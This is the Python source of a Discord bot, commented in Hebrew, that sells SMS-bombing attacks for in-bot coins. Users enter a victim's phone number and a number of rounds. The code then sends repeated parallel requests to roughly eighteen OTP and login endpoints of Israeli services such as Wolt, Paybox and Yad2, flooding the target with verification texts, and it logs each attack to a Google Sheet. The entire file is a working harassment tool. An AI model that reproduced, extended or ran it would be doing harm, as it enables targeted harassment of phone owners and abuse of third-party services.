import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import time
import logging
import json
from dotenv import load_dotenv

load_dotenv()

# הגדרת לוגים
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger('CyberIL-Ultra-Full')

# משתנים מ-Railway
TOKEN = os.getenv("DISCORD_TOKEN")
APPLICATION_ID = os.getenv("CLIENT_ID")
GSHEET_URL = os.getenv("GSHEET_URL")

class SpammerBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True 
        super().__init__(intents=intents, application_id=APPLICATION_ID)
        self.tree = app_commands.CommandTree(self)
        self.user_tokens = {}
        self.user_cooldowns = {}
        self.active_attacks = set()

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("✅ כל הפקודות סונכרנו והבוט מוכן!")

bot = SpammerBot()

# ════════════════════════════════════════
#   מנוע ה-API המלא (כל ה-50+)
# ════════════════════════════════════════

async def fetch_api(session, target, phone):
    phone_no_zero = phone[1:] if phone.startswith('0') else phone
    url = target["url"].replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
    method = target.get("method", "POST").upper()
    headers = target.get("headers", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    
    json_payload = None
    if "json" in target:
        json_str = json.dumps(target["json"]).replace("{{phone}}", phone).replace("+972{{phone}}", f"+972{phone_no_zero}")
        json_payload = json.loads(json_str)

    params_payload = None
    if "params" in target:
        params_str = json.dumps(target["params"]).replace("{{phone}}", phone)
        params_payload = json.loads(params_str)

    try:
        async with session.request(method, url, json=json_payload, params=params_payload, headers=headers, timeout=4) as resp:
            return 200 <= resp.status < 300
    except:
        return False

async def run_ultra_attack(phone):
    phone_no_zero = phone[1:]
    async with aiohttp.ClientSession() as session:
        targets = [
            # SMS Providers
            {"url": "https://019sms.co.il/api", "method": "POST", "json": {"send_otp": {"user": {"username": "test", "phone": phone, "app_id": 1, "source": "BOM"}}}},
            {"url": "https://api.globalsms.co.il/send", "method": "POST", "json": {"phone": phone, "message": "BOM"}},
            {"url": "https://smsim.co.il/api/sms", "method": "POST", "json": {"to": phone, "text": "BOM"}},
            {"url": "https://www.sms4free.co.il/api/send", "method": "GET", "params": {"phone": phone, "msg": "BOM"}},
            # Apps & Delivery
            {"url": "https://api.yad2.co.il/auth/sms", "method": "POST", "json": {"phone": phone, "service": "login"}},
            {"url": "https://api.paybox.co.il/auth/otp/send", "method": "POST", "json": {"phone": phone, "action": "verify"}},
            {"url": "https://restaurant-api.wolt.com/v1/auth/sms", "method": "POST", "json": {"phone_number": f"+972{phone_no_zero}"}},
            {"url": "https://api.tenbis.co.il/auth/otp", "method": "POST", "json": {"phone": phone, "type": "sms"}},
            {"url": "https://api.dominos.co.il/sendOtp", "method": "POST", "json": {"otpMethod": "text", "customerId": phone}},
            {"url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "json": {"phoneNumber": phone}},
            # Services & Portals
            {"url": "https://auth.riseup.co.il/v1/sms", "method": "POST", "json": {"msisdn": phone, "type": "otp"}},
            {"url": "https://api.tarya.co.il/auth/sms", "method": "POST", "json": {"phone_number": phone}},
            {"url": "https://api.riskified.com/auth/otp", "method": "POST", "json": {"phone": phone}},
            {"url": "https://auth.madlan.co.il/otp/send", "method": "POST", "json": {"phone": phone}},
            {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": phone, "type": "phone", "projectId": "1"}},
            {"url": "https://api.monday.com/v2", "method": "POST", "json": {"query": f'mutation{{sms{{phone:"{phone}"}}}}'}},
            {"url": "https://api.shufersal.co.il/auth/otp", "method": "POST", "json": {"phone": phone}},
            {"url": "https://api.ksp.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": phone}},
            # הוסיפו כאן את שאר ה-API באותו פורמט
        ]
        
        tasks = [fetch_api(session, t, phone) for t in targets]
        results = await asyncio.gather(*tasks)
        return results.count(True), results.count(False)

# ════════════════════════════════════════
#   לוגיקה ו-Google Sheets
# ════════════════════════════════════════

async def log_to_gsheet(user_name, user_id, phone, rounds, success, failed):
    if not GSHEET_URL: return
    payload = {"user_name": str(user_name), "user_id": str(user_id), "target_phone": str(phone), "rounds": int(rounds), "success_count": int(success), "failed_count": int(failed)}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(GSHEET_URL, json=payload, timeout=10)
    except: pass

# ════════════════════════════════════════
#   ממשק משתמש (Modals & Buttons)
# ════════════════════════════════════════

class BombingModal(discord.ui.Modal, title="⚡ SMS Elite Launcher"):
    phone = discord.ui.TextInput(label="מספר טלפון יעד", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label="כמות סיבובים (1-25)", default="5")

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value
        try: num_rounds = int(self.rounds.value)
        except: num_rounds = 1
        num_rounds = max(1, min(num_rounds, 25))
        uid = interaction.user.id
        
        await interaction.response.send_message(f"💣 **הפצצה החלה!** יעד: `{phone_num}`", ephemeral=True)
        bot.active_attacks.add(uid)

        s_total, f_total = 0, 0
        for _ in range(num_rounds):
            if uid not in bot.active_attacks or bot.user_tokens.get(uid, 0) < 1: break
            s, f = await run_ultra_attack(phone_num)
            s_total += s
            f_total += f
            bot.user_tokens[uid] -= 1
            await asyncio.sleep(1.2)

        if uid in bot.active_attacks: bot.active_attacks.remove(uid)
        await log_to_gsheet(interaction.user.name, uid, phone_num, num_rounds, s_total, f_total)
        await interaction.followup.send(f"✅ סיום הפצצה על `{phone_num}`.\nהצלחות: `{s_total}` | נכשלו: `{f_total}`", ephemeral=True)

class ControlPanel(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, custom_id="btn_launch")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        tokens = bot.user_tokens.get(interaction.user.id, 0)
        if tokens < 5: return await interaction.response.send_message("❌ אין מטבעות!", ephemeral=True)
        await interaction.response.send_modal(BombingModal())

    @discord.ui.button(label="🎫 טוקן יומי", style=discord.ButtonStyle.success, custom_id="btn_daily")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        if now - bot.user_cooldowns.get(uid, 0) < 86400:
            return await interaction.response.send_message("⏳ כבר לקחת היום!", ephemeral=True)
        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 120
        bot.user_cooldowns[uid] = now
        await interaction.response.send_message("✅ קיבלת 120 מטבעות!", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary, custom_id="btn_stop")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in bot.active_attacks:
            bot.active_attacks.remove(interaction.user.id)
            await interaction.response.send_message("🛑 הפצצה הופסקה.", ephemeral=True)
        else: await interaction.response.send_message("אין תקיפה פעילה.", ephemeral=True)

# ════════════════════════════════════════
#   פקודות סלאש (/)
# ════════════════════════════════════════

@bot.tree.command(name="setup_spammer", description="הצגת פאנל הספאמר")
async def setup_spammer(interaction: discord.Interaction):
    tokens = bot.user_tokens.get(interaction.user.id, 0)
    embed = discord.Embed(title="⚡ CyberIL Elite SMS", description=f"יתרה: **{tokens}** מטבעות.", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=ControlPanel())

@bot.tree.command(name="give_token", description="הענקת מטבעות (מנהל)")
@app_commands.checks.has_permissions(administrator=True)
async def give_token(interaction: discord.Interaction, user: discord.Member, amount: int):
    bot.user_tokens[user.id] = bot.user_tokens.get(user.id, 0) + amount
    await interaction.response.send_message(f"✅ הוספת {amount} מטבעות ל-{user.mention}.", ephemeral=True)

@bot.event
async def on_ready(): logger.info(f"🤖 {bot.user.name} Online!")

if __name__ == "__main__":
    if TOKEN: bot.run(TOKEN)
    else: logger.critical("BOT_TOKEN MISSING")
